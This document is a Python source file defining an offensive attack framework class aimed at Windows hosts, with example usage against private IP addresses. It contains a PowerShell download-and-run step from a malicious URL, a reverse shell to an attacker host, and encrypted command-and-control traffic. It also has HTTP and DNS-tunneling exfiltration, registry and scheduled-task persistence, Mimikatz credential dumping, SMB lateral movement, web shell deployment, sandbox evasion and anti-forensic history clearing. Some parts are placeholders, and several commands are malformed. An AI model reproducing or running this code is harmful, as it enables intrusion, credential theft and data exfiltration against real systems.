import subprocess
import base64
import os
import threading
import logging
from datetime import datetime
from cryptography.fernet import Fernet
import requests
import dns.resolver
import dns.exception
import random
import socket
import time
import json
import psutil
import structlog

class AdvancedCyberAttack:
    def __init__(self, attack_vector, external_server_url, encryption_key):
        self.attack_vector = attack_vector
        self.external_server_urls = [external_server_url]  # List for C2 server rotation
        self.cipher_suite = Fernet(encryption_key)
        self.timeout = 60
        self.reverse_shell_port = 4444
        self.attack_threads = []
        self.c2_session = requests.Session()  # Maintain session for C2 communications
        self.custom_c2_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'}  # Mimic a browser
        self.exploit_cache = {}  # Cache for compiled exploits
        self.retries = 3  # Number of retries for network operations
        self.init_logging()
        self.jira_url = "http://jira.example.com/rest/api/2/issue"
        self.jira_auth = ("username", "password")

    def init_logging(self):
        """Setup structured logging with JSON output for easier parsing."""
        structlog.configure(
            processors=[
                structlog.processors.TimeStamper(fmt="iso"),
                structlog.stdlib.add_log_level,
                structlog.processors.JSONRenderer()
            ],
            context_class=dict,
            logger_factory=structlog.stdlib.LoggerFactory(),
        )
        self.logger = structlog.get_logger()

    def log_action(self, action: str, details: str, success: bool, level=logging.INFO, category: str = "General"):
        """Log action with success/failure details, customizable log level, and category."""
        status = "Successful" if success else "Failed"
        self.logger.log(level, action=action, details=details, status=status, category=category)

    def encrypt_data(self, data: str):
        """Encrypt data using symmetric encryption (Fernet)."""
        return self.cipher_suite.encrypt(data.encode())

    def decrypt_data(self, encrypted_data: bytes):
        """Decrypt data using symmetric encryption (Fernet)."""
        return self.cipher_suite.decrypt(encrypted_data).decode()

    def retry_request(self, func, *args, **kwargs):
        """Retry mechanism for network operations."""
        for i in range(self.retries):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                self.log_action("Retry", f"Attempt {i + 1} failed: {e}", False, logging.WARNING, "Network")
                if i < self.retries - 1:
                    time.sleep(2)  # Wait before retrying
                else:
                    raise  # Re-raise the last exception if all retries fail

    def send_request_to_c2(self, command: str):
        """Send encrypted command to C2 server with retry mechanism and server rotation."""
        encrypted_command = self.encrypt_data(command)
        for url in self.external_server_urls:
            try:
                response = self.retry_request(self.c2_session.post, url, 
                                              data={"command": encrypted_command}, 
                                              headers=self.custom_c2_headers,
                                              timeout=self.timeout)
                if response.status_code == 200:
                    decrypted_response = self.decrypt_data(response.content)
                    self.log_action("C2 Communication", f"Command sent to {url}: {command[:10]}...", True, category="C2")
                    return decrypted_response
            except Exception as e:
                self.log_action("C2 Communication", f"Failed to connect to {url}: {e}", False, logging.ERROR, "C2")
        return None  # If all C2 servers fail

    def execute_fileless_attack(self, target: str):
        """Execute fileless attack via PowerShell with error handling."""
        ps_command = "Invoke-WebRequest -Uri http://malicious.url/payload -OutFile C:\\Windows\\Temp\\malicious.ps1; powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\malicious.ps1"
        try:
            subprocess.run(["powershell", "-Command", ps_command], check=True, shell=True, capture_output=True, text=True)
            self.log_action("Fileless Attack", f"Executed payload on {target}", True, category="Execution")
        except subprocess.CalledProcessError as e:
            self.log_action("Fileless Attack", f"Failed to execute payload on {target}. Error: {e.stderr}", False, logging.ERROR, "Execution")
        finally:
            self.clear_powershell_history()
            self.try_del_file("C:\\Windows\\Temp\\malicious.ps1")

    def clear_powershell_history(self):
        """Clear PowerShell command history to avoid detection."""
        subprocess.run(["powershell", "-Command", "Clear-History"], check=False)

    def try_del_file(self, path):
        """Try to delete a file, log if fails."""
        try:
            subprocess.run(["del", "/f", "/q", path], check=True, shell=True)
        except Exception as e:
            self.log_action("File Cleanup", f"Failed to delete {path}: {e}", False, logging.WARNING, "Anti-Forensic")

    def reverse_shell(self, target_ip, target_port):
        """Establish reverse shell connection with retry mechanism."""
        def shell_connect():
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((target_ip, target_port))
            client_socket.send(self.encrypt_data("Hello from attacker!"))
            self.log_action("Reverse Shell", f"Established with {target_ip}:{target_port}", True, category="Execution")
            return client_socket

        try:
            return self.retry_request(shell_connect)
        except Exception as e:
            self.log_action("Reverse Shell", f"Failed to establish with {target_ip}:{target_port} - {e}", False, logging.ERROR, "Execution")
            return None

    def sniff_network_traffic(self):
        """Sniff network traffic for sensitive data with error handling."""
        try:
            subprocess.run(["scapy", "sniff", "-i", "eth0", "-c", "10", "-w", "captured_data.pcap"], check=True, capture_output=True, text=True)
            self.log_action("Network Sniffing", "Network traffic captured", True, category="Collection")
            return True
        except Exception as e:
            self.log_action("Network Sniffing", f"Failed to sniff network traffic: {e}", False, logging.ERROR, "Collection")
            return False

    def exfiltrate_data(self, data: str):
        """Exfiltrate data with encryption, rotation of C2 URL, and retry mechanism."""
        encrypted_data = self.encrypt_data(data)
        try:
            response = self.retry_request(self.c2_session.post, self.external_server_urls[0], 
                                          data={"data": encrypted_data}, 
                                          headers=self.custom_c2_headers, 
                                          timeout=self.timeout)
            if response.status_code == 200:
                self.log_action("Data Exfiltration", "Data sent to C2", True, category="Exfiltration")
                return True
            else:
                self.log_action("Data Exfiltration", f"Failed, response status: {response.status_code}", False, logging.WARNING, "Exfiltration")
                return False
        except Exception as e:
            self.log_action("Data Exfiltration", f"Failed to exfiltrate data: {e}", False, logging.ERROR, "Exfiltration")
            return False

    def create_persistence(self):
        """Set up persistence using registry, WMI, and task scheduler with error handling."""
        try:
            # Registry persistence
            registry_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MyMalware /t REG_SZ /d 'C:\\path\\to\\malicious.exe' /f"
            subprocess.run(["powershell", "-Command", registry_command], check=True, capture_output=True, text=True)

            # WMI persistence
            wmi_command = "powershell -Command 'Get-WmiObject -Class Win32_StartupCommand | New-WmiObject -Class Win32_StartupCommand -Property @{Name=\"MaliciousApp\"; Command=\"C:\\path\\to\\program.exe\"; User=\"System\"}'"
            subprocess.run(["powershell", "-Command", wmi_command], check=True, capture_output=True, text=True)

            # Task Scheduler persistence
            task_command = "powershell -Command 'Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\\path\\to\\malicious.exe') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName MaliciousTask -Description 'Malicious Task' -RunLevel Highest -Force'"
            subprocess.run(["powershell", "-Command", task_command], check=True, capture_output=True, text=True)
            
            self.log_action("Persistence", "Persistence mechanisms set up", True, category="Persistence")
            return True
        except Exception as e:
            self.log_action("Persistence", f"Failed to set up persistence: {e}", False, logging.ERROR, "Persistence")
            return False

    def privilege_escalation(self):
        """Attempt privilege escalation using common methods and external tools."""
        try:
            # Example using a C-based exploit tool (assuming it's compiled and available)
            if self.attack_vector.get('target', {}).get('os') == 'Windows':
                c_exploit_path = "C:\\path\\to\\c_exploit.exe"
                subprocess.run([c_exploit_path], check=True, capture_output=True, text=True)
                self.log_action("Privilege Escalation", "C-based exploit used for escalation", True, category="Privilege Escalation")
            else:
                subprocess.run(["psexec", "/s", "/i", "cmd.exe"], check=True, capture_output=True, text=True)
            
            # Mimikatz example (assuming Mimikatz is available)
            subprocess.run(["mimikatz.exe", "privilege::debug", "token::elevate"], check=True, capture_output=True, text=True)
            self.log_action("Privilege Escalation", "Mimikatz used for token manipulation", True, category="Privilege Escalation")
            return True
        except Exception as e:
            self.log_action("Privilege Escalation", f"Privilege escalation failed: {e}", False, logging.ERROR, "Privilege Escalation")
            return False

    def lateral_movement(self, target_ip: str):
        """Move laterally using SMB, PowerShell, or BloodHound-like AD attack."""
        try:
            # Example using a Perl script for lateral movement
            perl_script_path = "/path/to/perl_script.pl"
            if os.path.exists(perl_script_path):
                subprocess.run(["perl", perl_script_path, target_ip], check=True, capture_output=True, text=True)
                self.log_action("Lateral Movement", f"Successfully moved to {target_ip} using Perl script", True, category="Lateral Movement")
            else:
                # SMB lateral movement
                smb_command = f"smbclient \\\\{target_ip}\\C$ -U 'user' -W 'domain' -c 'put malicious_file.exe C:\\Windows\\Temp\\malicious.exe'"
                subprocess.run(smb_command, shell=True, check=True, capture_output=True, text=True)
                self.log_action("Lateral Movement", f"Successfully moved to {target_ip} using SMB", True, category="Lateral Movement")

            # Simulating AD attack with BloodHound (assuming data is available)
            bloodhound_data = self.get_ad_info()  # Placeholder for AD data collection
            if bloodhound_data:
                self.log_action("Lateral Movement", f"Mapping AD with BloodHound data for {target_ip}", True, category="Lateral Movement")
                # Placeholder for actual BloodHound analysis
                return True
        except Exception as e:
            self.log_action("Lateral Movement", f"Failed to move to {target_ip}: {e}", False, logging.ERROR, "Lateral Movement")
            return False

    def evasion_techniques(self):
        """Obfuscate payload and detect sandbox environments with improved evasion."""
        payload = "malicious_payload"
        obfuscated_payload = self.obfuscate_payload(payload)
        self.log_action("Evasion", f"Using obfuscated payload: {obfuscated_payload[:10]}...", True, category="Defense Evasion")

        if self.detect_and_avoid_sandbox():
            self.log_action("Evasion", "Sandbox detected, aborting payload execution", False, logging.WARNING, "Defense Evasion")
            return None
        return obfuscated_payload

    def obfuscate_payload(self, payload: str):
        """Obfuscate payload using XOR with random key and base64 encoding."""
        key = bytes([random.randint(0, 255) for _ in range(len(payload))])
        obfuscated = ''.join(chr(ord(c) ^ k) for c, k in zip(payload, key))
        return base64.b64encode(obfuscated.encode()).decode()

    def perform_attack(self, target: str):
        """Execute multi-stage attack with error handling, logging, and multi-language exploits."""
        if self.detect_and_avoid_sandbox():
            self.log_action("Attack", "Aborted due to sandbox detection", False, logging.WARNING, "Initial Access")
            return

        self.log_action("Attack", f"Starting multi-stage attack on {target}", True, logging.INFO, "Initial Access")
        
        try:
            self.execute_fileless_attack(target)

            if self.is_internet_accessible():
                reverse_shell = self.reverse_shell("attacker_ip", self.reverse_shell_port)
                if reverse_shell:
                    reverse_shell.send(self.encrypt_data("Reverse shell established successfully."))
            
            self.sniff_network_traffic()

            self.exfiltrate_data("Sensitive Information")

            self.create_persistence()

            self.privilege_escalation()
            self.lateral_movement(target)
            
            # Additional post-exploitation
            self.post_exploitation(target)
        except Exception as e:
            self.log_action("Attack", f"General attack failure: {e}", False, logging.ERROR, "General")

    def is_internet_accessible(self):
        """Check if the internet is accessible with timeout."""
        try:
            socket.create_connection(("www.google.com", 80), timeout=10)
            self.log_action("Network Check", "Internet access available", True, category="Network")
            return True
        except (socket.timeout, socket.gaierror) as e:
            self.log_action("Network Check", f"No internet access available: {e}", False, logging.WARNING, "Network")
            return False

    def detect_and_avoid_sandbox(self):
        """Detect sandbox environments with more checks."""
        checks = [
            os.path.exists("C:\\Windows\\System32\\vmwaretools.dll"),
            os.path.exists("C:\\Program Files\\Oracle\\VirtualBox\\VBoxService.exe"),
            "QEMU" in subprocess.run(["wmic", "computersystem", "get", "manufacturer"], capture_output=True, text=True).stdout
        ]
        if any(checks):
            self.log_action("Evasion", "Sandbox/VM detected. Avoiding execution", False, logging.WARNING, "Defense Evasion")
            return True
        return False

    def perform_dynamic_attack(self, target: str):
        """Execute an adaptive attack strategy based on target behavior."""
        system_health = self.check_system_health(target)
        if system_health == 'unstable':
            self.log_action("Dynamic Attack", "Target system unstable, adjusting plan", True, logging.INFO, "Execution")
            self.adjust_attack_plan('low')
        else:
            self.adjust_attack_plan('high')

    def check_system_health(self, target: str):
        """Check system health to determine attack strategy."""
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        if cpu_usage > 80 or memory_usage > 80:
            return 'unstable'
        return 'stable'

    def adjust_attack_plan(self, severity: str):
        """Adjust the attack plan based on system stability with logging."""
        if severity == 'low':
            self.log_action("Attack Plan", "Executing low-impact attack plan", True, logging.INFO, "Execution")
            # Execute stealthier, lower-impact attacks
        elif severity == 'high':
            self.log_action("Attack Plan", "Executing high-impact attack plan", True, logging.INFO, "Execution")
            # Execute more aggressive attack phases

    def generate_report(self):
        """Generate a detailed attack report with all logged actions."""
        report = {
            "system_info": self.get_system_info(),
            "vulnerabilities": ["Placeholder Vulnerability"],  # Would typically be filled with real data
            "actions": self.get_actions_logged()
        }
        with open("attack_report.json", "w") as f:
            json.dump(report, f, indent=4)

    def get_system_info(self):
        """Gather detailed system information."""
        return {
            "os": os.name,
            "hostname": socket.gethostname(),
            "cpu_count": psutil.cpu_count(logical=False),
            "memory": psutil.virtual_memory().total
        }

    def get_actions_logged(self):
        """Return all logged actions from the log file."""
        with open("attack_log.txt", "r") as f:
            return [line.strip() for line in f]

    def compile_and_run_exploit(self, language, exploit_source, target_params):
        """Compile and run an exploit written in another language."""
        if language not in self.exploit_cache:
            self.exploit_cache[language] = {}
        
        if exploit_source not in self.exploit_cache[language]:
            try:
                if language == 'C':
                    compiled_exploit = f"{exploit_source}.exe"
                    subprocess.run(["gcc", exploit_source, "-o", compiled_exploit], check=True)
                    self.exploit_cache[language][exploit_source] = compiled_exploit
                elif language == 'Java':
                    compiled_exploit = f"{os.path.splitext(exploit_source)[0]}.class"
                    subprocess.run(["javac", exploit_source], check=True)
                    self.exploit_cache[language][exploit_source] = compiled_exploit
                else:
                    raise NotImplementedError(f"Support for {language} not implemented")
            except Exception as e:
                self.log_action("Exploit Compilation", f"Failed to compile {language} exploit: {e}", False, logging.ERROR, "Exploitation")
                return False

        try:
            if language == 'C':
                subprocess.run([self.exploit_cache[language][exploit_source]] + target_params, check=True)
            elif language == 'Java':
                subprocess.run(["java", "-cp", os.path.dirname(self.exploit_cache[language][exploit_source]), os.path.splitext(os.path.basename(exploit_source))[0]] + target_params, check=True)
            self.log_action("Exploit Execution", f"Successfully executed {language} exploit", True, category="Exploitation")
            return True
        except Exception as e:
            self.log_action("Exploit Execution", f"Failed to execute {language} exploit: {e}", False, logging.ERROR, "Exploitation")
            return False

    def post_exploitation(self, target: str):
        """Perform post-exploitation tasks like credential dumping and information gathering."""
        try:
            # Credential Dumping (Example using Mimikatz)
            subprocess.run(["mimikatz.exe", "sekurlsa::logonpasswords", "exit"], check=True, capture_output=True, text=True)
            self.log_action("Post-Exploitation", "Credentials dumped", True, category="Credential Access")

            # Gather system and network information
            system_info = self.get_system_info()
            network_info = self.get_network_info()
            self.log_action("Post-Exploitation", f"Gathered system and network info", True, category="Collection")

            # Exfiltrate detailed information
            self.exfiltrate_data(json.dumps({"system": system_info, "network": network_info}))
            
            # Simulate data harvesting (e.g., documents, emails)
            self.harvest_data(target)
            
            # Deploy web shell
            self.deploy_web_shell(target, "/inetpub/wwwroot/webshell.aspx", "path_to_webshell.aspx")
            
            # DNS Tunneling for additional data exfiltration
            self.dns_tunneling(json.dumps({"system": system_info, "network": network_info}), "example.com")
            
            # Log to Jira for collaboration
            self.log_to_jira("Post-Exploitation", "Performed post-exploitation tasks", True)
        except Exception as e:
            self.log_action("Post-Exploitation", f"Post-exploitation tasks failed: {e}", False, logging.ERROR, "Collection")

    def get_network_info(self):
        """Collect network information including open ports, interfaces, and IP configurations."""
        # Placeholder for network information
        return {"interfaces": "placeholder", "open_ports": "placeholder", "ip_config": "placeholder"}

    def harvest_data(self, target: str):
        """Simulate harvesting specific data like documents or emails."""
        # Placeholder for actual data harvesting
        self.log_action("Data Harvest", f"Harvesting data from {target}", True, category="Collection")
        # Here you would implement actual data collection methods, like searching for specific file types or email extraction

    def deploy_web_shell(self, target_ip, web_path, shell_payload):
        """Deploy a simple web shell to the target server."""
        try:
            smb_command = f"smbclient \\\\{target_ip}\\C$ -U 'user' -W 'domain' -c 'put {shell_payload} {web_path}'"
            subprocess.run(smb_command, shell=True, check=True, capture_output=True, text=True)
            self.log_action("Web Shell Deployment", f"Deployed web shell at {web_path}", True, category="Execution")
        except Exception as e:
            self.log_action("Web Shell Deployment", f"Failed to deploy web shell: {e}", False, logging.ERROR, "Execution")

    def dns_tunneling(self, data, domain):
        """Simulate DNS tunneling for data exfiltration."""
        try:
            # Encode data into DNS queries
            for chunk in [data[i:i+63] for i in range(0, len(data), 63)]:
                query = f"{base64.urlsafe_b64encode(chunk.encode()).decode()}.{domain}"
                dns.resolver.resolve(query, 'TXT')
            self.log_action("DNS Tunneling", f"Data sent via DNS tunneling to {domain}", True, category="Exfiltration")
        except (dns.exception.Timeout, dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) as e:
            self.log_action("DNS Tunneling", f"DNS tunneling failed: {e}", False, logging.ERROR, "Exfiltration")

    def log_to_jira(self, action, details, success):
        """Log actions to Jira for team collaboration."""
        status = "Successful" if success else "Failed"
        
        issue = {
            "fields": {
                "project": {"key": "REDTEAM"},
                "summary": f"{action} - {status}",
                "description": details,
                "issuetype": {"name": "Task"}
            }
        }
        
        try:
            response = requests.post(self.jira_url, json=issue, auth=self.jira_auth)
            response.raise_for_status()
            self.log_action("Jira Integration", "Logged action to Jira", True, category="Reporting")
        except requests.RequestException as e:
            self.log_action("Jira Integration", f"Failed to log to Jira: {e}", False, logging.ERROR, "Reporting")

    def exfiltrate_large_files(self, file_paths):
        """Exfiltrate large files using HTTP POST or cloud storage."""
        for file_path in file_paths:
            with open(file_path, 'rb') as file:
                try:
                    # Compress and encrypt the file content here if needed
                    response = self.c2_session.post(self.external_server_urls[0], files={"file": file})
                    if response.status_code == 200:
                        self.log_action("Large File Exfiltration", f"Exfiltrated {file_path}", True, category="Exfiltration")
                    else:
                        self.log_action("Large File Exfiltration", f"Failed to exfiltrate {file_path}, status: {response.status_code}", False, logging.WARNING, "Exfiltration")
                except Exception as e:
                    self.log_action("Large File Exfiltration", f"Failed to exfiltrate {file_path}: {e}", False, logging.ERROR, "Exfiltration")

    def check_vulnerability(self, target_ip, vulnerability_id):
        """Check for specific vulnerabilities like MS17-010."""
        if vulnerability_id == "MS17-010":
            # Simulate running a vulnerability check script
            result = subprocess.run(["nmap", "-p445", "--script=smb-vuln-ms17-010", target_ip], capture_output=True, text=True)
            if "VULNERABLE" in result.stdout:
                self.log_action("Vulnerability Check", f"Target {target_ip} is vulnerable to {vulnerability_id}", True, category="Reconnaissance")
                return True
            else:
                self.log_action("Vulnerability Check", f"Target {target_ip} not vulnerable to {vulnerability_id}", False, category="Reconnaissance")
                return False
        else:
            self.log_action("Vulnerability Check", f"Unsupported vulnerability check for {vulnerability_id}", False, logging.WARNING, "Reconnaissance")
            return False

    def launch_memory_exploit(self, target_ip, exploit_binary):
        """Launch a pre-compiled memory exploit."""
        try:
            subprocess.run([exploit_binary, target_ip], check=True, capture_output=True, text=True)
            self.log_action("Memory Exploit", f"Launched memory exploit on {target_ip}", True, category="Exploitation")
            return True
        except Exception as e:
            self.log_action("Memory Exploit", f"Memory exploit failed on {target_ip}: {e}", False, logging.ERROR, "Exploitation")
            return False

    def multithreaded_attack(self, targets: list):
        """Perform attack on multiple targets concurrently using threads."""
        threads = []
        for target in targets:
            thread = threading.Thread(target=self.perform_attack, args=(target,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        self.log_action("Multithreaded Attack", f"Completed attack on {len(targets)} targets", True, category="Execution")

    def get_ad_info(self):
        """Simulate getting Active Directory information."""
        # Placeholder for AD data collection, might use tools like BloodHound in real scenarios
        return {"placeholder": "AD Information"}

# Example usage:
encryption_key = Fernet.generate_key()
attack = AdvancedCyberAttack({"target": {"os": "Windows"}}, "http://c2server.com", encryption_key)
attack.perform_attack("192.168.1.100")
attack.multithreaded_attack(["192.168.1.101", "192.168.1.102"])
attack.generate_report()

# Additional examples:
# Check for a specific vulnerability
if attack.check_vulnerability("192.168.1.100", "MS17-010"):
    attack.log_action("Vulnerability Check", "Target vulnerable to MS17-010", True, category="Reconnaissance")

# Example of deploying a web shell
attack.deploy_web_shell("192.168.1.100", "/inetpub/wwwroot/webshell.aspx", "C:\\path\\to\\webshell.aspx")

# Example of using DNS tunneling for data exfiltration
attack.dns_tunneling(json.dumps({"data": "Example sensitive data"}), "example.com")

# Example of large file exfiltration
attack.exfiltrate_large_files(["C:\\path\\to\\large_file1.zip", "C:\\path\\to\\large_file2.zip"])

# Example of memory exploit
attack.launch_memory_exploit("192.168.1.100", "C:\\path\\to\\memory_exploit.exe")

# Log an action to Jira
attack.log_to_jira("Example Action", "This is a test action logged to Jira", True)
